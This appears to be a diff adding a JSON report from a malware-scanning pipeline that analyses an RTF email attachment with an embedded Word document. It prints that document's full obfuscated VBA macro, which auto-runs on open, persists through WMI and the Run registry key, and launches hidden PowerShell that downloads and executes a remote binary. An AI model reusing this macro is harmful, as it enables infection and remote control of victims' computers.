@@ -1,0 +1,199 @@
+{
+  "form": 1,
+  "observables": {
+    "file:170b804293599496c29d816cfe408adc5a99e767eb930b0c0cf9e7db62436abe": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "edge_vba_inside.rtf.rtfobj/edge_vba_inside.rtf_object_00000020.doc": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:2d2b2127b3e3b8cfc06d46ece6d346d15560246da69711231a5d719094f271c0",
+      "relationships": {
+        "extracted_from file:2d2b2127b3e3b8cfc06d46ece6d346d15560246da69711231a5d719094f271c0": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": true,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/x-ole-storage",
+            "type": "Composite Document File V2 Document, Cannot read section info"
+          },
+          "summary": "File Type Analysis: Composite Document File V2 Document, Cannot read section info (application/x-ole-storage) (ms office document) (ole compound file)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "hex string": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "<root>/files/edge_vba_inside.rtf.rtfobj/edge_vba_inside.rtf_object_00000020.doc",
+                "local_path": "5f6215a036890aff7ce33ebbda20fc8beb7ca7d1d1ebd71364750df0ab3ba5f9",
+                "stream_path": "VBA/ThisDocument",
+                "vba_code": "Const wnjnkjzuvm = 2\nConst oulsbdhnui = 1\nConst kdxxgwqvzi = 0\nPrivate Sub Document_Open()\nodhqmqfrpbeitdpnqt asalvxeqskzr(\"706f7765727368656c6c202d6e6f50202d737461202d772031202d656e632063774273414755415a514277414341414d774177414441414f77424a4147344164674276414773415a514174414663415a514269414649415a51\") & asalvxeqskzr(\"4278414855415a51427a414851414941426f414851416441427741484d414f674176414338416541427a41475541654142774147384163674275414738414c67426a4147774164514269414338414f41426941486f415a41416741433041547742314148514152674270414777415a514167414351415a514275414859414f67423041475541625142774146774161514178414334415a51423441475541\"), asalvxeqskzr(\"57696e646f7773536f667477617265557064\") & asalvxeqskzr(\"6174657231\")\nodhqmqfrpbeitdpnqt asalvxeqskzr(\"70\") & asalvxeqskzr(\"6f7765727368656c6c202d6e6f50202d737461202d772031202d656e632063774273414755415a514277414341414e414177414441414f77427a414745416341427a414341414967416b414755416267423241446f416441426c414730416341426341476b414d514175414755416541426c41434941\"), asalvxeqskzr(\"57696e646f7773536f6674776172\") & asalvxeqskzr(\"655570646174657232\")\nEnd Sub\nPublic Function nnkxasxmgkzxc(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nDim filterName, lzcgbinwymuvzcgugox As String\nDim cttxucgpri, qoxqsmabsc\nDim vneojnwlwvaxw, wmyrkpfbdhyrflpeayp, xvholaopxom\nDim uhrcqkzgjkyaj, vouyyrwslruhsxf, jxdtzxpgmvaijfjxfn\nOn Error GoTo Failed\nfilterName = olhfadbpwjmxcxgpd & asalvxeqskzr(\"45\") & asalvxeqskzr(\"76656e74\")\nlzcgbinwymuvzcgugox = olhfadbpwjmxcxgpd & asalvxeqskzr(\"436f6e\") & asalvxeqskzr(\"73756d6572\")\nSet cttxucgpri = CreateObject(asalvxeqskzr(\"5762656d536372697074696e672e5357\") & asalvxeqskzr(\"62656d4c6f6361746f72\"))\nSet qoxqsmabsc = cttxucgpri.ConnectServer(asalvxeqskzr(\"2e\"), asalvxeqskzr(\"726f6f745c737562736372\") & asalvxeqskzr(\"697074696f6e\"))\nSet vneojnwlwvaxw = qoxqsmabsc.Get(asalvxeqskzr(\"5f5f\") & asalvxeqskzr(\"4576656e7446696c746572\"))\nQuery = asalvxeqskzr(\"53454c454354202a2046524f4d205f5f496e7374616e63654d6f64696669636174696f6e4576656e74\") & asalvxeqskzr(\"2057495448494e20363020\") _\n& asalvxeqskzr(\"574845524520546172676574496e7374616e63652049\") & asalvxeqskzr(\"5341202757696e33325f50657266466f726d6174746564446174615f506572664f535f53797374656d2720\") _\n& asalvxeqskzr(\"414e4420546172676574496e7374616e63652e53797374656d557054696d65203e\") & asalvxeqskzr(\"3d2032303020414e4420\") _\n& asalvxeqskzr(\"546172676574\") & asalvxeqskzr(\"496e7374616e63652e53797374656d557054696d65203c20333230\")\nSet uhrcqkzgjkyaj = vneojnwlwvaxw.Spawninstance_\nuhrcqkzgjkyaj.Name = filterName\nuhrcqkzgjkyaj.eventNamespace = asalvxeqskzr(\"726f\") & asalvxeqskzr(\"6f745c63696d7632\")\nuhrcqkzgjkyaj.QueryLanguage = asalvxeqskzr(\"57514c\")\nuhrcqkzgjkyaj.Query = Query\nuhrcqkzgjkyaj.Put_\nSet wmyrkpfbdhyrflpeayp = qoxqsmabsc.Get(asalvxeqskzr(\"436f6d6d616e644c\") & asalvxeqskzr(\"696e654576656e74436f6e73756d6572\"))\nSet vouyyrwslruhsxf = wmyrkpfbdhyrflpeayp.Spawninstance_\nvouyyrwslruhsxf.Name = lzcgbinwymuvzcgugox\nvouyyrwslruhsxf.CommandLineTemplate = btgbbxojdajov\nvouyyrwslruhsxf.Put_\nSet xvholaopxom = qoxqsmabsc.Get(asalvxeqskzr(\"5f5f46696c746572\") & asalvxeqskzr(\"546f436f6e73756d657242696e64696e67\"))\nSet jxdtzxpgmvaijfjxfn = xvholaopxom.Spawninstance_\njxdtzxpgmvaijfjxfn.Filter = \"__EventFilter.Name=\"\"\" & filterName & \"\"\"\"\njxdtzxpgmvaijfjxfn.Consumer = \"CommandLineEventConsumer.Name=\"\"\" & lzcgbinwymuvzcgugox & \"\"\"\"\njxdtzxpgmvaijfjxfn.Put_\nnnkxasxmgkzxc = True\nExit Function\nFailed:\nnnkxasxmgkzxc = False\nEnd Function\nPublic Function ieawcjfoaskhnrksmmhk(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nOn Error GoTo Failed\nConst HKEY_CURRENT_USER = &H80000001\nstrKeyPath = asalvxeqskzr(\"53\") & asalvxeqskzr(\"6f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e\")\nstrComputer = asalvxeqskzr(\"2e\")\nSet hppqcwcwciltohggt = GetObject(asalvxeqskzr(\"77696e6d676d74733a7b696d706572736f6e6174696f6e4c65\") & asalvxeqskzr(\"76656c3d696d706572736f6e6174657d215c5c\") & strComputer & asalvxeqskzr(\"5c726f6f745c\") & asalvxeqskzr(\"64656661756c743a53746452656750726f76\"))\nstrValueName = olhfadbpwjmxcxgpd\nstrValue = btgbbxojdajov\nhppqcwcwciltohggt.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue\nieawcjfoaskhnrksmmhk = True\nExit Function\nFailed:\nieawcjfoaskhnrksmmhk = False\nEnd Function\nPublic Function odhqmqfrpbeitdpnqt(ByVal btgbbxojdajov As String, ByVal olhfadbpwjmxcxgpd As String) As Boolean\nIf nnkxasxmgkzxc(btgbbxojdajov, olhfadbpwjmxcxgpd) <> True Then\nieawcjfoaskhnrksmmhk btgbbxojdajov, olhfadbpwjmxcxgpd\nEnd If\nbhyyuwjdsaubzgkzqb\nEnd Function\nPublic Function bhyyuwjdsaubzgkzqb()\nOn Error GoTo Ersr\nSet jpgwdcjerskbupfdyr = CreateObject(asalvxeqskzr(\"57\") & asalvxeqskzr(\"5363\") & asalvxeqskzr(\"726970\") & asalvxeqskzr(\"742e53\") & asalvxeqskzr(\"6865\") & asalvxeqskzr(\"6c6c\"))\nDim pt\nDim sh\nDim bars\nDim cod\nDim cod2\ncod = \"dAByAHkAIAB7ACQAdwBDACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAOwAkAHcAQwAuAEgARQBBAGQAZQByAFMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGkAbgBIAHQAdABwACIAKQA7ACQAbABuAGsAIAA9ACAAIgBoAHQAdABwACIAIAArACAAIgBzADoALwAvAHMAZQB4AGMAcgBhAGYAdAAuAGMAbAB1AGIALwA2ADMANgAxADYAZQAiACAAKwAgACIANgA5ADcANwA3ADIAIgAgACsAIAAiADcAOQA2ADUANwA1ADYAYwAiACAAKwAgACIANgAyADcAOQAzADgAMwAyADMAOAAzADcAIgAgACsAIAAiADMANAA2ADMANwA3ADYAMQAzADgAMwAiACAAKwAgACIAOAAzADgALwBhAGIAYwAiACAAKwAgACIAZABlADUANAAzADIAIgAgACsAIAAiADEAYQBiAGMAZABlACIAIAArACAAIgAxADIAMwA0ADUAIgA7ACQAdwBDAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAGwAbgBrACwAIgAkAGUAbgB2AD\" & \"oAdABlAG0AcABcADIAMgA0AC4AZQB4AGUAIgApADsAcwBhAHAAcwAgACI\"\ncod2 = \"AJABlAG4AdgA6AHQAZQBtAHAAXAAyADIANAAuAGUAeABlACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAOwAkAGwAbgBrAHAAcgAgAD0AIAAiAGgAdAB0ACIAIAArACAAIgBwAH\" & \"MAOgAvAC8AcwBlAHgAYwByAGEAZgB0AC4AYwBsAHUAYgAvADMAOAA3ADEAMwA1ADYANgAzACIAIAArACAAIgA3ADMANQA3ADAAMwAyADMAMwA2ADMAMwA1ACIAIAArACAAIgA2AGUAMwA4ADMANQAzADIANgBlADcAMAA3ADYANgA2ADYAIgAgACsAIAAiAGYANgAxADMAMwA3ADcAMwA1ADMAOAA2AGUALwBwAHMAcwBhAHcAOQAzADcAIgAgACsAIAAiADMANQBtAGkAeQBwAHMALwAiADsAJAB3AEMALgBIAEUAQQBkAGUAcgBTAC4AQQBkAGQAKAAiAFUAcwBlAHIALQBBAGcAZQBuAHQAIgAsACIAVwBpAG4ASAB0AHQAcAAiACkAOwAkAHcAQwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAbABuAGsAcAByACkAOwB9AGMAYQB0AGMAaAB7AH0A\"\npt = asalvxeqskzr(\"70\") & asalvxeqskzr(\"6f\") & asalvxeqskzr(\"776572\")\nsh = asalvxeqskzr(\"73\") & asalvxeqskzr(\"6865\") & asalvxeqskzr(\"6c6c\")\nbars = asalvxeqskzr(\"202d\") & asalvxeqskzr(\"457865\") & asalvxeqskzr(\"63\") & asalvxeqskzr(\"7574696f\") & asalvxeqskzr(\"6e\") & asalvxeqskzr(\"506f6c\") & asalvxeqskzr(\"69637920\") & asalvxeqskzr(\"62\") & asalvxeqskzr(\"7970\") & asalvxeqskzr(\"6173\") & asalvxeqskzr(\"73202d6e\") & asalvxeqskzr(\"6f70\") & asalvxeqskzr(\"726f66\") & asalvxeqskzr(\"696c65\") & asalvxeqskzr(\"202d\") & asalvxeqskzr(\"77696e\") & asalvxeqskzr(\"64\") & asalvxeqskzr(\"6f777374\") & asalvxeqskzr(\"796c6520\") & asalvxeqskzr(\"68\") & asalvxeqskzr(\"69\") & asalvxeqskzr(\"646465\") & asalvxeqskzr(\"6e202d\") & asalvxeqskzr(\"65\") & asalvxeqskzr(\"6e\") & asalvxeqskzr(\"6320\")\njpgwdcjerskbupfdyr.Run pt & sh & bars & cod & cod2, 0\nErsr:\nEnd Function\nPrivate Function asalvxeqskzr(ByVal msybfiemglor As String) As String\nDim uqrmfktnkywt As Long\nFor uqrmfktnkywt = 1 To Len(msybfiemglor) Step 2\nasalvxeqskzr = asalvxeqskzr & Chr$(Val(\"&H\" & Mid$(msybfiemglor, uqrmfktnkywt, 2)))\nNext uqrmfktnkywt\nEnd Function\n\n",
+                "vba_filename": "ThisDocument.cls"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (1 macro files) (OLE) | autoexec=1, suspicious=1, hex string=1",
+          "tags": {}
+        },
+        "pcodedmp": {
+          "details": {
+            "line_count": 435
+          },
+          "summary": "PCode Analysis: decoded 435 lines",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true,
+        "microsoft_office": true,
+        "ole": true,
+        "olevba": true
+      }
+    },
+    "file:2d2b2127b3e3b8cfc06d46ece6d346d15560246da69711231a5d719094f271c0": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "edge_vba_inside.rtf": {
+          "type=document.rtf": true,
+          "type=email.attachment": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": true,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/rtf",
+            "type": "Rich Text Format data, version 1"
+          },
+          "summary": "File Type Analysis: Rich Text Format data, version 1 (text/rtf) (ms office document) (rtf document)",
+          "tags": {}
+        },
+        "rtfole": {
+          "details": {
+            "extracted_files": [
+              "edge_vba_inside.rtf.rtfobj/edge_vba_inside.rtf_object_00000020.doc"
+            ],
+            "return_code": 0,
+            "stderr": "",
+            "stdout": "rtfobj 0.60.1 on Python 3.14.10 - http://decalage.info/python/oletools\nTHIS IS WORK IN PROGRESS - Check updates regularly!\nPlease report any issue at https://github.com/decalage2/oletools/issues\n\n===============================================================================\nFile: 'edge_vba_inside.rtf' - size: 47224 bytes\n---+----------+---------------------------------------------------------------\nid |index     |OLE Object                                                     \n---+----------+---------------------------------------------------------------\n0  |00000020h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Word.Document.8'                                 \n   |          |data size: 23552                                               \n   |          |MD5 = 'b78e53325f45a16ab719c392444f2983'                       \n   |          |CLSID:                                                         \n   |          |unknown CLSID (please report at                                \n   |          |https://github.com/decalage2/oletools/issues)                  \n---+----------+---------------------------------------------------------------\nSaving file embedded in OLE object #0:\n  format_id  = 2\n  class name = b'Word.Document.8'\n  data size  = 23552\n  saving to file edge_vba_inside.rtf.rtfobj/edge_vba_inside.rtf_object_00000020.doc\n  md5 b78e53325f45a16ab719c392444f2983\n"
+          },
+          "summary": "RTF OLE Object Analysis: extracted edge_vba_inside.rtf.rtfobj/edge_vba_inside.rtf_object_00000020.doc",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "rtf": true
+      }
+    },
+    "file:5f6215a036890aff7ce33ebbda20fc8beb7ca7d1d1ebd71364750df0ab3ba5f9": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "edge_vba_inside.rtf.rtfobj/edge_vba_inside.rtf_object_00000020.doc.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:170b804293599496c29d816cfe408adc5a99e767eb930b0c0cf9e7db62436abe",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with very long lines (748)"
+          },
+          "summary": "File Type Analysis: ASCII text, with very long lines (748) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:fe0957024595307c9b083effc3231498bc7b7945d28bc1d5aa6d97d9e0729c25": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "edge_vba_inside.rtf.rtfobj/edge_vba_inside.rtf_object_00000020.doc.pcode.bas": {
+          "type=script.vbscript": true
+        }
+      },
+      "redirection": "file:170b804293599496c29d816cfe408adc5a99e767eb930b0c0cf9e7db62436abe",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with very long lines (695)"
+          },
+          "summary": "File Type Analysis: ASCII text, with very long lines (695) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    }
+  }
+}
